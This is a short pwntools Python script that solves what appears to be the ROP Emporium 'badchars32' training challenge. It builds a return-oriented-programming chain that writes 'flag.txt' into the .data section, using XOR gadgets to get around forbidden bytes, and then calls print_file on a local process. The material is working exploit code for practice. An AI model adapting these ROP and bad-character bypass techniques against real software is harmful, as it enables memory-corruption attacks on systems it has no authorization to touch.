from pwn import *
#from pwnlib import *
# we can use the .data section to write flag.txt since it is writable and has 8 bytes at 0x0804a018

# can do that with the useful gadget and pop rdi

# chaining with it with ret to the 0x8048538 with the .data as first param
buf = b'A'*4
buf += b'B'*4
buf += b'C'*4
buf += b'D'*4
buf += b'E'*4
buf += b'F'*4
buf += b'G'*4
buf += b'H'*4
buf += b'I'*4
buf += b'J'*4
buf += b'K'*4
# to put 0101010101 in ebp for the bl register
buf += p32(0x0804839d)
buf += p32(0x01010101)
# put flbh in esi .data in edi and ebp = .data+2
buf += p32(0x080485b9)
buf += b'flbh'
buf += p32(0x0804a018)
buf += p32(0x0804a01a)
#storing flbh in .data
buf += p32(0x0804854f)
#making flbh to flag
buf += p32(0x0804854b)
buf +=p32(0x080485bb)
buf +=p32(0x0804a01b)
buf += p32(0x0804854b)
# put /tyt in esi .data+4 in edi and ebp = .data+4
buf += p32(0x080485b9)
buf += b'/tyt'
buf += p32(0x0804a01c)
buf += p32(0x0804a01c)
#storing /tyt in .data+4
buf += p32(0x0804854f)
#making /tyt to .txt
buf += p32(0x0804854b)
buf +=p32(0x080485bb)
buf +=p32(0x0804a01e)
buf += p32(0x0804854b)
#calling printfile
buf += p32(0x080483d0)
buf += p32(0x0804a018)*3

p = process("./badchars32")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
#gdb.attach(p)
p.sendline(buf)
p.interactive()
p.close()